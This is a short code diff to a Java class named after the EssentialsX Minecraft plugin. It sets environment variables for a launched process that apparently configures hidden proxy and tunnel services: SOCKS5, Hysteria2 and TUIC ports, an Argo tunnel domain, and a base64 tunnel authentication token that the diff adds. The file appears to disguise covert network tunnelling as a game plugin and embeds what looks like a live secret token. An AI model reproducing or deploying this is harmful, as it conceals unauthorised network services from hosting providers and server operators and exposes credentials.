@@ -72,13 +72,13 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "45a57b6b-753c-4b7d-8b2f-26062b3262cc");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25518");
+        env.put("ARGO_DOMAIN", "jacobx.1791765.xyz");
+        env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiNmIxZjU0MDEtMWVkMy00YjVmLTkzYWItNWZhNGJjZWJmZjhiIiwicyI6Ik1UazNOVGs1WVRBdFlUSm1PUzAwTXpNd0xUaGpZakF0TkRkaE1qSTBPVFkzWWpNNCJ9");
+        env.put("S5_PORT", "25565");
+        env.put("HY2_PORT", "25565");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
